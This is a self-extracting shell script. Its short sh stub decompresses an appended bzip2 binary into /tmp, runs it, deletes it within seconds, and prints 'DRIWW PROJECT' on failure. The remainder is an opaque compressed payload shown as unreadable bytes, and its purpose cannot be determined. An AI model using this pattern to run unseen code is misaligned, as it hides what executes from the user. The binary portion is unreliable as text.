#!/bin/sh
skip=23
set -C
umask=`umask`
umask 77
tmpfile=`tempfile -p gztmp -d /tmp` || exit 1
if /usr/bin/tail -n +$skip "$0" | /bin/bzip2 -cd >> $tmpfile; then
  umask $umask
  /bin/chmod 700 $tmpfile
  prog="`echo $0 | /bin/sed 's|^.*/||'`"
  if /bin/ln -T $tmpfile "/tmp/$prog" 2>/dev/null; then
    trap '/bin/rm -f $tmpfile "/tmp/$prog"; exit $res' 0
    (/bin/sleep 5; /bin/rm -f $tmpfile "/tmp/$prog") 2>/dev/null &
    /tmp/"$prog" ${1+"$@"}; res=$?
  else
    trap '/bin/rm -f $tmpfile; exit $res' 0
    (/bin/sleep 5; /bin/rm -f $tmpfile) 2>/dev/null &
    $tmpfile ${1+"$@"}; res=$?
  fi
else
  echo DRIWW PROJECT $0; exit 1
fi; exit $res
BZh91AY&SY��  ���D����/oޮ����PD@ @���&ِh!"hѦ�6�h4i� �F�   i2'�<hS�= ��� �� �h4�i�C��M�b A$���Ѧ���M��eH�f�F���M =Gy��S�e;�ˏ��-�8�0�gѓ�۪\�K��4M��6�	$����#�6rl���4'��K���c*��O)"!@��U��:���dCs�q�ż�Q�bӔKRA$���#��AV�`p�[>�`�f��g,tʲŃ��G�NR�ƺJ��U�܁	M����D��A�����Tt[<&bm۷-X�,�Ͱ����䂆J�eɇ�ު�ؓ�pT㺉<�jc�q9y�=K<�u!���Q5��b�OĹ���E&^G��c0!���P�e�!S`l����H$����Q�1A�S�@ף_�����}%�r�@�D3>��zs��$	��@ռ:��*FB��{�0���w[���&�����z�Wd:��v��B�j p0wĠŪ�[�3z��מ�����06i�~7u�sW���U��"��G5���f��ctW�DA5z������B�6���f�s�:%�oq\D��v=��A�9#2#�j6f���$S
�*P�>)���)��;$�#���eb��0�7�T5��E�#8����-��"�㇩`\�쪧C�L����r���꽚�Uz��	�Y'L�mf"(�L&�Q�c�=�6��$�S���2S�K�aP�Lv�
]Z0Em�J�!���4R1��c�@�6B�Xt֠��N���t�`���.?�C}N�S,&s����A�@����&a����)�>�h